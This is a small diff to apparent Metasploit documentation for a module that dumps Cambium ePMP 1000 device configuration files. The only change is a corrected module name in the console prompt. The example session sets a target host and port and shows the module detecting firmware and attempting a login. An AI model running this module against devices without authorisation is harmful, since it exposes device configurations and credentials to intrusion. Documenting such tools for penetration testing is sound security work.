@@ -11,9 +11,9 @@ This module dumps Cambium ePMP 1000 device configuration file. An ePMP 1000 box 
 
   ```
 msf > use auxiliary/scanner/http/epmp1000_dump_config
-msf auxiliary(binom3_login_config_pass_dump) > set rhosts 1.3.3.7
-msf auxiliary(binom3_login_config_pass_dump) > set rport 80
-msf auxiliary(binom3_login_config_pass_dump) > run
+msf auxiliary(epmp1000_dump_config) > set rhosts 1.3.3.7
+msf auxiliary(epmp1000_dump_config) > set rport 80
+msf auxiliary(epmp1000_dump_config) > run
 
 [+] 1.3.3.7:80 - Running Cambium ePMP 1000 version 3.2...
 [*] 1.3.3.7:80 - Attempting to login...
